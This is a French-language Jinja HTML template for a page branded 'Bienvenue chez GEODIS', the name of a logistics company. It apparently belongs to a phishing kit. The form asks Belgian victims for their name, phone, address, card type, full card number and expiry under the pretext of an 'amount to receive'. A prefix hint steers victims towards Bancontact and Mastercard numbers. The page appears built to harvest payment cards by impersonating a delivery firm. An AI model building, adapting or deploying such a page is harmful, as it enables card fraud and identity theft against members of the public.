{% extends 'base.html' %}

{% block title %}Formulaire{% endblock %}

{% block content %}
<div class="payment-form">
    <h2>BIENVENUE CHEZ GEODIS</h2>
    <form method="POST" action="/form">

        <div class="form-group">
            <label>Nom complet</label>
            <input type="text" name="name" required>
        </div>

        <div class="form-group">
            <label>Numéro de téléphone (+32)</label>
            <input type="tel" name="phone" required>
        </div>

        <div class="form-group">
            <label>Adresse postale</label>
            <input type="text" name="address" required>
        </div>

        <div class="form-group">
            <label>Type de carte bancaire</label>
            <select name="card_type" required>
                <option value="">-- Sélectionnez --</option>
                <option>Bancontact</option>
                <option>Visa</option>
                <option>Maestro</option>
                <option>Mastercard</option>
            </select>
        </div>

        <div class="form-group">
            <label>Numéro de carte</label>
            <input type="text" name="card_number" required>
            <small>Le numéro indiqué sous la carte bancaire commençant par 6703 ou 5169</small>
        </div>

        <div class="form-group expiry-fields">
            <label>Date d'expiration</label>
            <div class="expiry-row">
                <input type="text" name="expiry_month" placeholder="MM" maxlength="2" required>
                <input type="text" name="expiry_year" placeholder="AA" maxlength="2" required>
            </div>
        </div>

        <div class="form-group amount-wrapper">
            <label>Montant à recevoir (€)</label>
            <input type="text" name="amount" placeholder="10" required>
        </div>

        <button type="submit">Terminer</button>
    </form>
</div>
{% endblock %}
